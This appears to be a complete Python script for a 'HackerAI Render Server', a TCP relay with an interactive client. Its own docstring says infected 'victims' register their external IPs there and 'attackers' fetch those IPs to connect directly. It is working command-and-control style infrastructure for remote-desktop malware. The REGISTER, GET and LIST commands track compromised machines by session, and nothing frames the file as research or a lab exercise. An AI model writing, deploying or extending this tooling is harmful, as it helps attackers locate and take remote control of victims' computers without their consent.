#!/usr/bin/env python3
"""
HackerAI Render Server — Central IP Relay
Victims register their external IP here.
Attackers query this server to get the victim's IP and then connect directly.

Protocol (simple JSON over TCP):
  → REGISTER:<session_id>:<password>   - Victim registers its IP
  → GET:<session_id>:<password>         - Attacker fetches the victim's IP
  → LIST                                - List all active sessions
  → QUIT                                - Disconnect

Response format:
  OK:<data>  or  ERR:<message>
"""

import socket
import threading
import json
import time
import argparse
import sys
from datetime import datetime

# ─── Configuration ────────────────────────────────────────────────────────────
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 9999
SESSION_TIMEOUT = 300  # seconds before an unrefreshed session expires
CLEANUP_INTERVAL = 60  # seconds between cleanup passes

# ─── Session Store ────────────────────────────────────────────────────────────
active_sessions = {}       # session_id -> {ip, port, password, timestamp, label}
sessions_lock = threading.Lock()


def cleanup_expired_sessions():
    """Periodically remove stale sessions."""
    while True:
        time.sleep(CLEANUP_INTERVAL)
        now = time.time()
        with sessions_lock:
            expired = [
                sid for sid, info in active_sessions.items()
                if now - info["timestamp"] > SESSION_TIMEOUT
            ]
            for sid in expired:
                print(f"[CLEANUP] Removing expired session: {sid}")
                del active_sessions[sid]


# ─── Client Handler ───────────────────────────────────────────────────────────
def handle_client(conn, addr):
    """Handle a single client connection to the render server."""
    print(f"[CONNECT] Client connected from {addr[0]}:{addr[1]}")
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break

            message = data.decode("utf-8", errors="replace").strip()
            print(f"[RECV] {addr[0]}:{addr[1]} → {message}")

            if message.startswith("REGISTER:"):
                handle_register(conn, addr, message)
            elif message.startswith("GET:"):
                handle_get(conn, addr, message)
            elif message == "LIST":
                handle_list(conn)
            elif message == "QUIT":
                break
            else:
                conn.sendall(b"ERR:Unknown command\n")

    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        print(f"[DISCONNECT] {addr[0]}:{addr[1]} — {e}")
    except Exception as e:
        print(f"[ERROR] {addr[0]}:{addr[1]} — {e}")
    finally:
        conn.close()


def handle_register(conn, addr, message):
    """REGISTER:<session_id>:<password>[:label]"""
    parts = message.split(":", 3)
    if len(parts) < 3:
        conn.sendall(b"ERR:Invalid REGISTER format. Use REGISTER:<session_id>:<password>[:label]\n")
        return

    session_id = parts[1]
    password = parts[2]
    label = parts[3] if len(parts) > 3 else "unnamed"

    if len(session_id) < 3 or len(session_id) > 64:
        conn.sendall(b"ERR:Session ID must be 3-64 characters\n")
        return

    if len(password) < 4 or len(password) > 128:
        conn.sendall(b"ERR:Password must be 4-128 characters\n")
        return

    with sessions_lock:
        # If session exists, verify password
        if session_id in active_sessions:
            if active_sessions[session_id]["password"] != password:
                conn.sendall(b"ERR:Session ID already registered with different password\n")
                return

        active_sessions[session_id] = {
            "ip": addr[0],
            "port": None,       # Will be set when client connects for streaming
            "password": password,
            "timestamp": time.time(),
            "label": label,
            "registered_from": f"{addr[0]}:{addr[1]}"
        }

    print(f"[REGISTER] Session '{session_id}' (label: {label}) ← {addr[0]}:{addr[1]}")
    conn.sendall(f"OK:Session '{session_id}' registered. IP: {addr[0]}\n".encode())


def handle_get(conn, addr, message):
    """GET:<session_id>:<password>"""
    parts = message.split(":", 2)
    if len(parts) < 3:
        conn.sendall(b"ERR:Invalid GET format. Use GET:<session_id>:<password>\n")
        return

    session_id = parts[1]
    password = parts[2]

    with sessions_lock:
        if session_id not in active_sessions:
            conn.sendall(b"ERR:Session not found\n")
            return

        session = active_sessions[session_id]
        if session["password"] != password:
            conn.sendall(b"ERR:Incorrect password\n")
            return

        # Return session info as JSON
        info = {
            "ip": session["ip"],
            "label": session["label"],
            "registered_at": datetime.fromtimestamp(session["timestamp"]).isoformat()
        }
        response = f"OK:{json.dumps(info)}\n"

    print(f"[GET] {addr[0]}:{addr[1]} ← session '{session_id}' → {info['ip']}")
    conn.sendall(response.encode())


def handle_list(conn):
    """LIST — Return all active sessions (without passwords)."""
    with sessions_lock:
        if not active_sessions:
            conn.sendall(b"OK:No active sessions\n")
            return

        lines = [f"Active Sessions ({len(active_sessions)}):"]
        for sid, info in sorted(active_sessions.items()):
            age_secs = int(time.time() - info["timestamp"])
            lines.append(
                f"  • {sid} | IP: {info['ip']} | Label: {info['label']} | "
                f"Age: {age_secs}s ago"
            )
        response = "OK:\n" + "\n".join(lines) + "\n"

    conn.sendall(response.encode())


# ─── Server ───────────────────────────────────────────────────────────────────
def start_render_server(host, port):
    """Start the render server."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(20)
    server.settimeout(1.0)

    print(f"""
╔══════════════════════════════════════════════════╗
║       HackerAI Render Server v1.0                ║
║       Central IP Relay & Session Manager         ║
╠══════════════════════════════════════════════════╣
║  Listening on: {host}:{port:<21}║
║  Session timeout: {SESSION_TIMEOUT}s                     ║
║  Cleanup interval: {CLEANUP_INTERVAL}s                    ║
╚══════════════════════════════════════════════════╝
    """)

    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_expired_sessions, daemon=True)
    cleanup_thread.start()

    print("Waiting for connections...\n")

    while True:
        try:
            conn, addr = server.accept()
            client_thread = threading.Thread(
                target=handle_client, args=(conn, addr), daemon=True
            )
            client_thread.start()
        except socket.timeout:
            continue
        except KeyboardInterrupt:
            print("\n[SHUTDOWN] Server stopping...")
            break
        except Exception as e:
            print(f"[ERROR] Accept failed: {e}")

    server.close()


# ─── Interactive Client CLI ───────────────────────────────────────────────────
def run_interactive_client(server_host, server_port):
    """Connect to the render server and interact manually."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((server_host, server_port))
    except Exception as e:
        print(f"[!] Could not connect to render server: {e}")
        sys.exit(1)
    sock.settimeout(None)

    print(f"""
╔══════════════════════════════════════════════╗
║    HackerAI Render Client — Interactive CLI  ║
╠══════════════════════════════════════════════╣
║  Connected to {server_host}:{server_port:<16}║
╚══════════════════════════════════════════════╝
    """)
    print("Commands:")
    print("  REGISTER:<id>:<pass>[:label]   — Register a session")
    print("  GET:<id>:<pass>                 — Get victim IP for session")
    print("  LIST                            — List all active sessions")
    print("  QUIT                            — Exit\n")

    try:
        while True:
            cmd = input("render> ").strip()
            if not cmd:
                continue
            if cmd.upper() == "QUIT":
                sock.sendall(b"QUIT\n")
                break

            sock.sendall((cmd + "\n").encode())
            response = sock.recv(8192).decode("utf-8", errors="replace")
            print(response)
    except KeyboardInterrupt:
        print()
    finally:
        sock.close()
        print("Disconnected.")


# ─── Main ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="HackerAI Render Server — Central IP Relay for Remote Desktop"
    )
    parser.add_argument("--host", default=DEFAULT_HOST, help=f"Bind address (default: {DEFAULT_HOST})")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Port (default: {DEFAULT_PORT})")
    parser.add_argument("--client", action="store_true", help="Run as interactive CLI client instead of server")
    args = parser.parse_args()

    if args.client:
        run_interactive_client(args.host, args.port)
    else:
        start_render_server(args.host, args.port)
